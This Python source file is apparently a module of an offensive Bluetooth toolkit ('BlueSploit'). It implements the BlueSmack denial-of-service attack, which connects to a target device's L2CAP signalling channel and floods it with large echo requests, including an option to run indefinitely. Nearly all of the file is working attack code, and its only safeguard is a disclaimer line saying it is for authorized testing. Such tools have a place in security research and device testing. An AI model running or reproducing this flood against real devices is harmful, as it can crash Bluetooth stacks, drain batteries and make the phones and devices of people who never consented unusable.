"""
BlueSploit Module: BlueSmack - L2CAP Echo Flood DoS
Classic Bluetooth denial of service via L2CAP echo requests

Sends large L2CAP echo requests to overwhelm target device's
Bluetooth stack, causing high CPU usage, battery drain, or crashes.

Author: v33ru
"""

import struct
import time
import socket
from typing import Optional
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# L2CAP Constants
L2CAP_COMMAND_REJ = 0x01
L2CAP_ECHO_REQ = 0x08
L2CAP_ECHO_RSP = 0x09


class Module(ExploitModule):
    """
    BlueSmack - L2CAP Echo Flood DoS
    
    Exploits the L2CAP echo mechanism to flood a target with
    large echo request packets. This can cause:
    - High CPU usage on target
    - Battery drain on mobile devices
    - Bluetooth stack crashes
    - Device unresponsiveness
    
    Similar to the classic "Ping of Death" but for Bluetooth.
    
    DISCLAIMER: For authorized security testing only.
    """
    
    info = ModuleInfo(
        name="exploits/dos/classic/bluesmack",
        description="BlueSmack - L2CAP Echo Flood DoS Attack",
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.MEDIUM,
        references=[
            "https://trifinite.org/trifinite_stuff_bluesmack.html",
            "https://www.bluetooth.com/specifications/specs/core-specification/"
        ]
    )
    
    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "size": ModuleOption(
                name="size",
                required=False,
                description="Echo packet size in bytes (max 65535)",
                default=600
            ),
            "count": ModuleOption(
                name="count",
                required=False,
                description="Number of packets to send (0 = infinite)",
                default=1000
            ),
            "delay": ModuleOption(
                name="delay",
                required=False,
                description="Delay between packets in ms (0 = no delay)",
                default=0
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Connection timeout in seconds",
                default=10
            )
        }
    
    def _create_l2cap_echo_packet(self, size: int, identifier: int = 1) -> bytes:
        """
        Create L2CAP echo request packet.
        
        L2CAP signaling packet format:
        - Code: 1 byte (0x08 = Echo Request)
        - Identifier: 1 byte
        - Length: 2 bytes (little-endian)
        - Data: variable
        """
        # Create payload of specified size
        payload = b'X' * size
        
        # L2CAP signaling header
        header = struct.pack('<BBH', L2CAP_ECHO_REQ, identifier & 0xFF, len(payload))
        
        return header + payload
    
    def _print_results(self, target: str, packets_sent: int, 
                       start_time: float, success: bool) -> None:
        """Print attack results"""
        C = Colors
        elapsed = time.time() - start_time
        pps = packets_sent / elapsed if elapsed > 0 else 0
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  {C.BOLD}{C.WHITE}BLUESMACK ATTACK RESULTS{C.RESET}")
        print(f"  {C.CYAN}{'='*70}{C.RESET}")
        print(f"  Target        : {C.WHITE}{target}{C.RESET}")
        print(f"  Packets Sent  : {C.YELLOW}{packets_sent}{C.RESET}")
        print(f"  Duration      : {elapsed:.2f} seconds")
        print(f"  Rate          : {pps:.1f} packets/sec")
        print(f"  Status        : {C.GREEN if success else C.RED}{'COMPLETED' if success else 'FAILED'}{C.RESET}")
        
        if success:
            print(f"\n  {C.YELLOW}[*] Attack completed - check target device status{C.RESET}")
            print(f"  {C.YELLOW}    Target may experience lag, crashes, or battery drain{C.RESET}")
        
        print(f"\n  {C.CYAN}{'='*70}{C.RESET}\n")
    
    def run(self) -> bool:
        """Execute BlueSmack attack"""
        
        if not BLUETOOTH_AVAILABLE:
            print_error("PyBluez library not installed!")
            print_info("Try one of these installation methods:")
            print_info("  1. pip install pybluez2")
            print_info("  2. pip install git+https://github.com/pybluez/pybluez.git")
            print_info("  3. sudo apt install python3-bluez")
            return False
        
        target = self.target
        size = int(self.get_option("size"))
        count = int(self.get_option("count"))
        delay = int(self.get_option("delay")) / 1000.0
        timeout = int(self.get_option("timeout"))
        
        # Validate
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        if size > 65535:
            print_warning("Size capped at 65535 bytes")
            size = 65535
        
        # Print attack info
        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BlueSmack - L2CAP Echo Flood DoS{C.RESET}                        {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        
        print_info(f"Target      : {target}")
        print_info(f"Packet Size : {size} bytes")
        print_info(f"Count       : {'infinite' if count == 0 else count}")
        print_info(f"Delay       : {delay*1000:.0f}ms")
        
        print()
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Starting in 3 seconds... (Ctrl+C to stop)")
        
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print_warning("Cancelled")
            return False
        
        sock = None
        packets_sent = 0
        start_time = time.time()
        success = False
        
        try:
            print_info("Creating L2CAP socket...")
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(timeout)
            
            # Connect to L2CAP signaling channel (PSM 1)
            print_info(f"Connecting to {target}...")
            sock.connect((target, 1))
            print_success("Connected!")
            
            print_info(f"Flooding with {size}-byte echo requests...")
            
            identifier = 1
            infinite = (count == 0)
            
            while infinite or packets_sent < count:
                try:
                    # Create and send echo packet
                    pkt = self._create_l2cap_echo_packet(size, identifier)
                    sock.send(pkt)
                    packets_sent += 1
                    identifier = (identifier + 1) % 256
                    
                    # Progress
                    if packets_sent % 100 == 0:
                        elapsed = time.time() - start_time
                        pps = packets_sent / elapsed if elapsed > 0 else 0
                        if infinite:
                            print(f"\r  {C.CYAN}[{packets_sent} packets sent @ {pps:.1f} pps]{C.RESET}    ", end='', flush=True)
                        else:
                            pct = packets_sent * 100 // count
                            bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
                            print(f"\r  [{C.CYAN}{bar}{C.RESET}] {pct}% ({packets_sent}/{count}) @ {pps:.1f} pps", end='', flush=True)
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except KeyboardInterrupt:
                    print()
                    print_warning("Interrupted by user")
                    break
                except (OSError, IOError) as e:
                    if "Connection reset" in str(e):
                        print()
                        print_warning("Connection reset - target may have crashed!")
                        success = True
                        break
                    raise
            
            print()
            success = True
            
        except (OSError, IOError) as e:
            err_str = str(e)
            if "Connection refused" in err_str:
                print_error("Connection refused")
            elif "Host is down" in err_str:
                print_error("Host is down")
            elif "timed out" in err_str.lower():
                print_error("Connection timed out")
            else:
                print_error(f"Error: {e}")
        except Exception as e:
            print_error(f"Error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        self._print_results(target, packets_sent, start_time, success)
        
        self.add_result({
            "target": target,
            "packets_sent": packets_sent,
            "packet_size": size,
            "duration": time.time() - start_time,
            "success": success
        })
        
        return success
